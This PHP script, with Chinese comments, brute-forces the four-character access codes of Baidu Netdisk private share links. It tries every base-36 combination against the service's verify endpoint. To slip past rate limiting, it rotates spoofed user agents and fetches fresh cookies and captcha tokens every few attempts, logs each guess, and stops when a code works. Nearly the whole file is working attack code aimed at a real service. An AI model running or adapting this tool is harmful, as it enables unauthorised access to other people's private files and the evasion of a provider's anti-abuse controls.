<?php
/*
 * http://pan.baidu.com/share/verify?shareid=1418533617&uk=242193955&t=时间戳+随机三位数&bdstoken=xxxxxxxx&channel=chunlei&clienttype=0&web=1&app_id=250528&logid=base64(时间戳+随机三位数+000.+随机15-20位数)
 */

/* 共有167 9616个

每秒钟10个，
一分钟600个，
一小时3 6000个，
十小时36 0000个，

*/

// 获取参数
$data  = get_data();
$surl  = get_arr($data, 'surl');      // 要破解的百度网盘资料的surl
$start = intval(get_arr($data, 'start'));    // 从哪个数字开始验证密码
$end   = intval(get_arr($data, 'end'));        // 验证到哪个密码
$limit = intval(get_arr($data, 'limit'));      // 要破解的百度网盘资料的surl
$sure  = $data['sure']; // 是否确认
//dump($data);die;

if ( ! $surl)
{
	$note = <<<NOTE
NOTE需要传递参数 
sure：是否确认
surl：要破解的surl
start:从哪个数字开始
end:到哪个数字结束
limit: 从开始的数字起验证多少位，如果与end参数冲突，以end参数为准，默认为1000
NOTE;

	output($note);
	die;
}

if ($start < 0)
{
	$start = 0;
}

if ( ! $limit)
{
	$limit = 1000;
}

if ( ! $end)
{
	$end = $start + $limit;
}

if ($end > 1679616)
{
	$end = 1679616;
}

$url        = 'https://pan.baidu.com/share/init?surl='.$surl;
$h          = init_file($surl);
$limit      = pow(36, 4);
$user_agent = get_user_agent();
$cookie_tmp = get_cookie($url, $user_agent);
$vcode_str  = get_code($cookie_tmp);
for ($i = $start, $j = 1; $i < $end; $i ++, $j ++)
{
	if ($j % 4 == 0)
	{
		$j          = 1;
		$user_agent = get_user_agent();
		$cookie_tmp = get_cookie($url, $user_agent);
		$vcode_str  = get_code($cookie_tmp);
	}
	$str = get_str($i);
	ll($h, $i.'---'.$str, FALSE);
	$re = get_pan($url, $cookie_tmp, $user_agent, $str, $vcode_str, $h);
	if ($re)
	{
		ll($h, $i.'::::::ok::::::::'.$str);
		break;
	}
}

close_file($h);
die('script is over. ok!');
function get_str($i)
{
	$n   = base_convert($i, 10, 36);
	$n   = str_pad($n, 4, 0, STR_PAD_LEFT);
	$arr = str_split($n, 1);
	$str = implode('', $arr);

	return $str;
}

function get_cookie($url, $user_agent)
{
	// 根据地址获取百度网盘的真正地址
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'Accept-Encoding:gzip, deflate, br',
		'Accept-Language:zh-CN,zh;q=0.9',
		'Connection:keep-alive',
		'Host:pan.baidu.com',
		'Upgrade-Insecure-Requests:1',
		'User-Agent:'.$user_agent,
	]);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	// 只获取响应头就行了
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	$result = curl_exec($ch);

	// 获得响应结果里的：头大小
	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	curl_close($ch);
	// 根据头大小去获取头信息内容
	$header = substr($result, 0, $headerSize);

	$header_arr = explode(PHP_EOL, $header);
	$headers    = [];
	foreach ($header_arr as $value)
	{
		$value = trim($value);
		if ($value && strpos($value, ':') !== FALSE)
		{
			list($k, $v) = explode(':', $value, 2);
			$headers[$k] = $v;
		}
	}
	$cookie_tmp = $headers['Set-Cookie'];

	return $cookie_tmp;
}

function get_pan($url, $cookie_tmp, $user_agent, $pwd = '', $vcode_str = '', $h)
{
	/*if ($headers['Set-Cookie'])
	{
		$cookies = $headers['Set-Cookie'];
		$cookies = explode(';', $cookies);
		$cookie  = [];
		foreach ($cookies as $value)
		{
			$value = trim($value);
			if ($value && strpos($value, '=') !== FALSE)
			{
				list($k, $v) = explode('=', $value, 2);
				setcookie($k, $v);
				$cookie[$k] = $v;
			}
		}
	}*/
	$surl       = substr($url, - 7);
	$t          = get_total_millisecond();
	$data       = [
		'pwd'       => $pwd,
		'vcode'     => $pwd,
		'vcode_str' => $vcode_str,
	];
	$data       = http_build_query($data);
	$verify_url = 'https://pan.baidu.com/share/verify?';
	$verify_url .= 'surl='.$surl;
	$verify_url .= '&t='.$t;
	$verify_url .= '&bdstoken=null';
	$verify_url .= '&channel=chunlei';
	$verify_url .= '&clienttype=0';
	$verify_url .= '&web=1';
	$verify_url .= '&app_id=250528';
	$verify_url .= '&logid=MTUxNDQzMTk1NzA0NjAuNTQzNjA4ODMwNDk3MzIwMw==';
	$ch         = curl_init($verify_url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Accept:*/*',
		'Accept-Encoding:gzip, deflate, br',
		'Accept-Language:zh-CN,zh;q=0.9',
		'Cache-Control:no-cache',
		'Connection:keep-alive',
		//		'Content-Length:26',
		'Content-Type:application/x-www-form-urlencoded; charset=UTF-8',
		'Cookie:'.$cookie_tmp,
		'Host:pan.baidu.com',
		'Origin:https://pan.baidu.com',
		'Pragma:no-cache',
		'Referer:https://pan.baidu.com/share/init?surl='.$surl,
		'User-Agent:'.$user_agent,
		'X-Requested-With:XMLHttpRequest',
	]);
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_POST, TRUE);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
//	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Encoding: gzip, deflate'));
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
	curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	$result = curl_exec($ch);
	// 获得响应结果里的：头大小
	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	// 根据头大小去获取头信息内容
	$header = substr($result, 0, $headerSize);
	$result = substr($result, $headerSize);

	$header_arr = explode(PHP_EOL, $header);
	$headers    = [];
	foreach ($header_arr as $value)
	{
		$value = trim($value);
		if ($value && strpos($value, ':') !== FALSE)
		{
			list($k, $v) = explode(':', $value, 2);
			$headers[$k] = $v;
		}
	}
	curl_close($ch);
	$result = json_decode(trim($result), TRUE);
	if ( ! is_array($result))
	{
		return FALSE;
	}
	if ( ! isset($result['errno']))
	{
		return FALSE;
	}
	ll($h, $result, TRUE);
	switch ($result['errno'])
	{
		case 0:
			return TRUE;
			break;
		case - 9:
			return FALSE;
			break;
		case - 62:
			// 请求验证码
			output($headers);
			output($result);
//			$code      = get_code($cookie_tmp);
//			$vcode_str = $code['vcode_str'];
//			get_pan($url, $cookie_tmp, $user_agent, $pwd, $vcode_str);
//			output($code);
			die('end reason:62');

			return FALSE;
			break;
		default:
			return FALSE;
			break;
	}
	/*
	 * {"errno":-9,"err_msg":"","request_id":4817706520363686291}        //密码错误
	{"errno":-62,"request_id":206026661042873124}                        //要验证码了
	{"errno":0,"err_msg":"","request_id":4817740255807962253}        //密码正确
		-12 好像是位数不正确
		0:成功;
	-1:由于您分享了违反相关法律法规的文件，分享功能已被禁用，之前分享出去的文件不受影响。;
	-2:用户不存在;请刷新页面后重试;-3:文件不存在;请刷新页面后重试;
	-4:登录信息有误，请重新登录试试;
	-5:登录信息有误，请重新登录试试;
	-6:请重新登录;
	-7:该分享已删除或已取消;
	-8:该分享已经过期;
	-9:访问密码错误;
	-10:分享外链已经达到最大上限100000条，不能再次分享;
	-11:验证cookie无效;
	-14:对不起，短信分享每天限制20条，你今天已经分享完，请明天再来分享吧！;
	-15:对不起，邮件分享每天限制20封，你今天已经分享完，请明天再来分享吧！;
	-16:对不起，该文件已经限制分享！;
	-17:文件分享超过限制;
	-19:验证码输入错误，请重试;
	-20:请求验证码失败，请重试;
	-21:未绑定手机或邮箱，没有权限私密分享;
	-22:被分享的文件无法重命名，移动等操作;
	-30:文件已存在;
	-31:文件保存失败;
	-32:你的空间不足了哟，赶紧购买空间吧;
	-33:一次支持操作999个，减点试试吧;
	-40:热门推荐失败;
	-60:相关推荐数据异常;
	-62:密码输入次数达到上限;
	-64:描述包含敏感词;
	-70:你分享的文件中包含病毒或疑似病毒，为了你和他人的数据安全，换个文件分享吧;
	1:服务器错误;
	2:参数错误;
	3:未登录或帐号无效;
	4:存储好像出问题了，请稍候再试;
	12:批量处理错误;
	14:网络错误，请稍候重试;
	15:操作失败，请稍候重试;
	16:网络错误，请稍候重试;
	105:创建链接失败，请重试;
	106:'文件读取失败，请<ahref=javascript:window.location.reload();>刷新</a>页面后重试';
	108:文件名有敏感词，优化一下吧;
	110:您今天分享太多了，24小时后再试吧;
	111:外链转存失败，请稍候重试;
	112:'页面已过期，请<ahref=javascript:window.location.reload();>刷新</a>后重试';
	113:外链签名有误;
	114:当前任务不存在，保存失败;
	115:该文件禁止分享;
	116:分享不存在;117:分享已经过期;2126:文件名中含有敏感词;
	2135:对方拒绝接收消息;2102:群组不存在;2103:你已退出该群;
	9100:'你的帐号存在违规行为，已被冻结，<ahref=/disk/appeal>查看详情</a>';
	9200:'你的帐号存在违规行为，已被冻结，<ahref=/disk/appeal>查看详情</a>';
	9300:'你的帐号存在违规行为，该功能暂被冻结，<ahref=/disk/appeal>查看详情</a>';
	9400:'你的帐号异常，需验证后才能使用该功能，<ahref=/disk/appeal>立即验证</a>';
	9500:'您的帐号存在安全风险，已进入保护模式，请修改密码后使用;<a
		 */
}

function get_code($cookie)
{
	$curl = curl_init();
	curl_setopt_array($curl, array(
		CURLOPT_URL            => "https://pan.baidu.com/api/getcaptcha?prod=shareverify&web=1,1&t=0.17097459915762636&bdstoken=190ef621ed867f40947197f283e8ce63&channel=chunlei&clienttype=0&app_id=250528&logid=MTUxNTAzNjcyNDU2MDAuOTczNTMzMjA2MzQ1MzA2NA==",
		CURLOPT_RETURNTRANSFER => TRUE,
		CURLOPT_SSL_VERIFYHOST => 0,
		CURLOPT_SSL_VERIFYPEER => 0,
		CURLOPT_ENCODING       => "",
		CURLOPT_MAXREDIRS      => 10,
		CURLOPT_TIMEOUT        => 30,
		CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST  => "GET",
		CURLOPT_HTTPHEADER     => array(
			"Cookie:$cookie",
			"Accept: application/json, text/javascript, */*; q=0.01",
			"Accept-Encoding: gzip, deflate, br",
			"Accept-Language: zh-CN,zh;q=0.9",
			"Cache-Control: no-cache",
			"Connection: keep-alive",
			"Host: pan.baidu.com",
			"Postman-Token: 28e3df5e-b0ff-1b1c-35ab-bc9dc0bdbe21",
			"Pragma: no-cache",
			"Referer: https://pan.baidu.com/share/init?surl=dEoq2A1",
			"User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
			"X-Requested-With: XMLHttpRequest",
		),
	));

	$response = curl_exec($curl);
	$err      = curl_error($curl);

	curl_close($curl);

	if ( ! $err)
	{
		$re = json_decode($response, TRUE);
		if (is_array($re))
		{
			if (isset($re['vcode_str']))
			{
				return $re['vcode_str'];
			}
		}
	}

	return FALSE;
}

/*
*返回字符串的毫秒数时间戳
*/
function get_total_millisecond()
{
	$time  = explode(" ", microtime());
	$time  = $time [1].($time [0] * 1000);
	$time2 = explode(".", $time);
	$time  = $time2[0];

	return $time;
}

/*
 * 获取随机的user-agent
 */
function get_user_agent()
{
	$user_agent = array(
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
		"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) App leWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
		"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
		"Opera/9.25 (Windows NT 5.1; U; en)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
		"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
	);

//	return $user_agent[0];

	return $user_agent[array_rand($user_agent)];
}

/**
 * 浏览器友好的变量输出
 *
 * @param mixed   $var    变量
 * @param boolean $echo   是否输出 默认为True 如果为false 则返回输出字符串
 * @param string  $label  标签 默认为空
 * @param boolean $strict 是否严谨 默认为true
 *
 * @return void|string
 */
function dump($var, $echo = TRUE, $label = NULL, $strict = TRUE)
{
	$label = ($label === NULL) ? '' : rtrim($label).' ';
	if ( ! $strict)
	{
		if (ini_get('html_errors'))
		{
			$output = print_r($var, TRUE);
			$output = '<pre>'.$label.htmlspecialchars($output, ENT_QUOTES).'</pre>';
		}
		else
		{
			$output = $label.print_r($var, TRUE);
		}
	}
	else
	{
		ob_start();
		var_dump($var);
		$output = ob_get_clean();
		if ( ! extension_loaded('xdebug'))
		{
			$output = preg_replace('/\]\=\>\n(\s+)/m', '] => ', $output);
			$output = '<pre>'.$label.htmlspecialchars($output, ENT_QUOTES).'</pre>';
		}
	}
	if ($echo)
	{
		echo($output);

		return NULL;
	}
	else
	{
		return $output;
	}
}

function output($string)
{
	if (is_array($string))
	{
		var_export($string);
	}
	else
	{
		echo $string;
	}
	echo PHP_EOL;
	//echo '<br/>';
	//ob_flush();
	flush();
}

function init_file($surl)
{
	$file = __DIR__ . 'baiduyun2.php/' .$surl.'.txt';
	if ( ! is_file($file))
	{
		touch($file);
	}
	else
	{
		file_put_contents($file, '');
	}

	$h = fopen($file, 'w+');

	return $h;
}

function ll($h, $data, $eol = TRUE)
{
	$data = json_encode($data);
	if ($eol)
	{
		$data .= PHP_EOL;
	}
	output($data);
	fwrite($h, $data);
}

function close_file($h)
{
	fclose($h);
}

function get_data()
{
	// 是否是cli 模式下的
	$sapi_type = php_sapi_name();
	$is_cli    = (substr($sapi_type, 0, 3) == 'cgi') ? FALSE : TRUE;

	$data = [];

	if ($is_cli)
	{
		// $_SERVER['argv']里面保存的就是脚本的参数，那么需要
		$argv = $_SERVER['argv'];
		$argc = $_SERVER['argc'];
		$preg = '/^--([\w]+)=([\w]+)/';
		foreach ($argv as $k => $arg)
		{
			if ($k == 0)
			{
				$data['filename'] = $arg;
			}
			elseif (preg_match($preg, $arg, $match))
			{
				if ($match)
				{
					$data[$match[1]] = $match[2];
				}
			}
		}
	}
	else
	{
		$data = $_GET;
	}

	return $data;
}

function get_arr(array $arr, $key, $default = NULL)
{
	if (isset($arr[$key]))
	{
		return $arr[$key];
	}

	return $default;
}
